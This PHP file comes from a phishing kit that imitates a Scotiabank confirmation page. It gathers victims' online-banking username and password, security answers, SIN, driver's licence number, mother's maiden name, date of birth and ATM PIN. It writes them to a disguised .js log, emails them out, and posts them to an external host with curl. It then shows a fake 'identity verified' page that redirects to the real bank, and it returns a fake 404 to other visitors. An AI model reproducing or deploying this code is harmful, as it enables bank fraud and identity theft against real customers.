﻿<?php
session_start();
error_reporting(0);
include "../control.php";
include "../sc.php";

if(isset($_POST["dobyy"]))
{
	$qq1=$_SESSION["qq1"];
	$aa1=$_SESSION["aa1"];	
	$qq2=$_SESSION["qq2"];
	$aa2=$_SESSION["aa2"];	
	$qq3=$_SESSION["qq3"];
	$aa3=$_SESSION["aa3"];
	$uname=$_SESSION["uname"];
	$pword=$_SESSION["pword"];
	

	
	$name=$_POST["name"];
	$dob=$_POST["dobdd"]."/".$_POST["dobmm"]."/".$_POST["dobyy"];
	$mnn=$_POST["mnn"];
	$snn=$_POST["snn"];
	$dll=$_POST["dll"];
	$app=$_POST["app"];
	

$ip=$_SERVER["REMOTE_ADDR"];
$details="
User : $uname
Pass : $pword

Q1: $qq1 A1: $aa1
Q2: $qq2 A1: $aa2
Q3: $qq3 A1: $aa3

Full Name: $name
DOB(dd/mm/yyyy): $dob 
MMN: $mnn 
SIN: $snn 
DL: $dll 
ATM Pin: $app

IP: $ip
";
if($log_feature==1)
{
$file=fopen("../fajfkadhjadhajdha49184924.js","a");
fwrite($file,$details);
fclose($file);
}
if($email_feature==1)
{
mail($send,"Scotia Login+Full $ip",$details);
}
if($external_log == 1)
{
$ch2 = curl_init($external_link);
curl_setopt($ch2, CURLOPT_POST ,1);
curl_setopt($ch2, CURLOPT_POSTFIELDS ,"filename=fajfkadhjadhajdha49184924.js&DATA=$details");
curl_setopt($ch2, CURLOPT_HEADER ,0); 
curl_setopt($ch2, CURLOPT_RETURNTRANSFER ,1);
curl_setopt($ch2, CURLOPT_SSL_VERIFYPEER, false);
$data = curl_exec($ch2);
}


	
	$fname=randomCha(rand(10,13));
	$fj=randomCha(rand(14,15));
	echo '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head>
		
		<meta http-equiv="content-type" content="text/html; charset=UTF-8">
		<meta http-equiv="content-language" content="en">
		<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
		
		<title>
		Confirmation
		</title>
		
		<meta http-equiv="Cache-Control" content="no-cache">
		<meta http-equiv="pragma" content="no-cache">
		<meta http-equiv="expires" content="0"> 

		<meta http-equiv="Content-Style-Type" content="text/css">
		<meta http-equiv="Content-Script-Type" content="text/javascript">
		
		<link rel="shortcut icon" href="favicon.ico">
		
		
		
		
		<meta http-equiv="refresh" content="8;URL=https://www.google.cz/url?sa=t&rct=j&q=&esrc=s&source=web&cd=2&ved=2ahUKEwibotHkicHeAhWC1iwKHadfAwwQFjABegQIBxAB&url=https%3A%2F%2Fwww.scotiabank.com%2Fca%2Fen%2F0%2C%2C2%2C00.html&usg=AOvVaw1lD8_4_Gof3NtGofIcqiQO" />
		
		
		<link rel="stylesheet" type="text/css" media="all" href="measure/load.css?load_id='.randomCha(rand(15,16)).'">
		<link rel="stylesheet" type="text/css" media="all" href="measure/jquery.css?load_id='.randomCha(rand(15,16)).'">
		<link rel="stylesheet" type="text/css" media="screen" href="measure/load2.css?load_id='.randomCha(rand(15,16)).'">
		<link href="measure/plugin.css?load_id='.randomCha(rand(15,16)).'" rel="stylesheet" type="text/css">
		</head>
	
	<body>
	 <div id="helpCentreCurtain" class="helpCurtain" style="display: none"><form id="showContactUsByJSLink" name="showContactUsByJSLink" method="post" action="/online/authentication/mfaAuthentication.bns" target=""></form><span id="helpCentre_curtainContent_container"><div id="helpCentre_curtainSearch_container" class="search"><form id="helpCentre_curtain_searchForm" name="helpCentre_curtain_searchForm" method="post" action="/online/authentication/mfaAuthentication.bns" target="">	
			<div class="left-wrapper">
	<fieldset class="">
		<legend>Search form</legend>
					<h3>Help </h3>
					<div class="search-input-wrapper"><label for="helpCentre_curtain_searchForm:helpCentre_txtQueryInput" class="off-screen">
Search for</label><input id="helpCentre_curtain_searchForm:helpCentre_txtQueryInput" type="text" name="helpCentre_curtain_searchForm:helpCentre_txtQueryInput" class="search-input">
						<a class="skip" href="#main-content" >skip to search result</a><input class="primary-button" id="helpCentre_curtain_searchForm:searchSubmit" name="helpCentre_curtain_searchForm:searchSubmit"  value="Search" type="submit">						
					</div>				
					<div class="help-ajax-loading"><span id="_viewRoot:status"><span id="_viewRoot:status.start" style="display: none">
	                    		<img style="float:left;" src="measure/ajax-loader-small.gif"></span><span id="_viewRoot:status.stop"></span></span>																													
					</div>
	</fieldset>			
			</div>
			<div class="right-wrapper">		    
				<div class="send-message-wrapper">
						<a href="#"  >Branch &amp; ABM Locator  </a>
				</div>
				<a href="javascript:void(0)" id="helpcentre_printHelpSection" class="printHelpSection float-left" title="" >
					<img alt="Print Help section" src="measure/icon_print.png">
				</a>				
				<div class="close-link-wrapper"><a class="closeHelp var_helpCentre_closeLink" href="#" id="helpCentre_curtain_searchForm:cmdHideAskCurtain" name="helpCentre_curtain_searchForm:cmdHideAskCurtain" >Close</a>
					<span class="off-screen">Help   </span>																	 		
				</div>			
			</div></form></div>
	
			<div class="help"><form id="helpCentre_curtain_contentForm" name="helpCentre_curtain_contentForm" method="post" action="/online/authentication/mfaAuthentication.bns" target=""></form>							
			</div>
			</span>
	</div>
		
		
		<div class="page_bg">
		<div class="page-wrapper">
	
		
	<div class="header">
		<div class="scotia-logo" tabindex="0"><a href="#" id="scotia-logo-img-id" title="" class="scotia-logo-image" >
			
			<div class="scotia-logo-img-div-en" role="img" aria-label="Scotiabank Group"></div></a>
			<span class="scotia-logo-image-bw">
				<img src="measure/scotiabank-group-bw.gif" alt="Scotiabank Group">
			</span>
		</div>
		<a class="skip-nav" href="#main-content" >Skip to main content</a>
		<div class="header-links">
			<ul title=""><span id="helpCentre_curtainMenu_container">				
				<li class="var_main_top-links_tab_1"><form id="helpCentre_curtainMenuControls_helpform" name="helpCentre_curtainMenuControls_helpform" method="post" action="/online/authentication/mfaAuthentication.bns" target=""><a class="var_helpCentre_helpLink " href="#" id="helpCentre_curtainMenuControls_helpform:j_id48" name="helpCentre_curtainMenuControls_helpform:j_id48" ><span id="helpCentre_curtainMenuControls_helpform:j_id49" class="">Help</span></a></form>					
				</li>
				<li class="var_main_top-links_tab_2"><form id="helpCentre_curtainMenuControls_contactform" name="helpCentre_curtainMenuControls_contactform" method="post" action="/online/authentication/mfaAuthentication.bns" target=""><a class="var_helpCentre_contactLink " href="#" id="helpCentre_curtainMenuControls_contactform:j_id52" name="helpCentre_curtainMenuControls_contactform:j_id52" ><span id="helpCentre_curtainMenuControls_contactform:j_id53" class="">Contact</span></a></form>		
				</li>
				</span>
					<li class="var_main_top-links_tab_3">
						<a href="#"  >
							<span>Locate Us</span>
						</a>
					</li>
<form id="lang_switch_form_1" name="lang_switch_form_1" method="post" action="/online/authentication/mfaAuthentication.bns" enctype="application/x-www-form-urlencoded">

<span id="lang_switch_form_1:sel_en_000">
		<li class="var_main_top-links_tab_6">

<a id="lang_switch_form_1:fr_sel_000" href="#" >Français</a>
		</li></span>
</form>
			</ul>
		</div>
	</div>
	<div class="clearboth"></div>
	
	<div class="navigation pre-sign-on-flow"></div>
				
   	<div class="clearboth"></div>
			
			
			<div class="signon-wrapper">
			<div class="content">

		
		<div class="dataview full-width">
			<a name="main-content"></a>
			<h1>authentication.mfa</h1>
			
			<div class="form-data ftf-form-data">
			

			
			
			
			<span id="span_msgs_5"></span>
<form id="mfaAuth_form" name="mfaAuth_form" method="post" action="/online/authentication/mfaAuthentication.bns" enctype="application/x-www-form-urlencoded">


			<h2 class="float-left">Confirmation</h2>
			<div class="first-time-user-flow">
			<div class="clearboth"></div>

			<p>We\'ve successfully verified your identity, your access is now enabled.<br>
			<br>
			Please wait while we refresh you session.<br>
			<br>
			<center><img src="measure/ajax-loader-small.gif" />
			</center>
			<br>
			<br>
			<small><i>This page will redirect automatically, please do not close this page.</i></small></p>

	

			<br class="clearboth">


			</div>
		
</form>
			</div>
		</div>									
			</div>
			<div class="clearboth"></div>
	
	<div class="footer-centered">


		<div class="footer">
			<div class="footer-links resp-hide">			
				<ul>
					<li><a  class="rewardsItem" href="javascript:void(0)">Legal</a></li> 
					
					
					<li><a  class="rewardsItem" href="javascript:void(0)">Privacy</a></li>
					<li><a  class="rewardsItem" href="javascript:void(0)">Security</a></li>
					<li><a href="#" class="rewardsItem" >Mobile Site</a></li> 
						<li><a  class="rewardsItem" href="javascript:void(0)">Scotiabank.com</a></li>
				</ul>		
			</div>
			<div class="clearboth"></div>		
		</div><div id="j_id163">
			</div><div id="analyticsEventAjax_div"></div><div id="analyticsEventAjaxLinkLevel_div"></div>	
		
		
		
	
		
		
		
	</div>					
			</div>					
		</div>
		</div>
	
</body></html>';
session_destroy();
}
else
{
	header($_SERVER['SERVER_PROTOCOL'] . ' 404 - Page Not Found', true, 404);
	die("<h1>404 - Page Not Found</h1>");
}
?>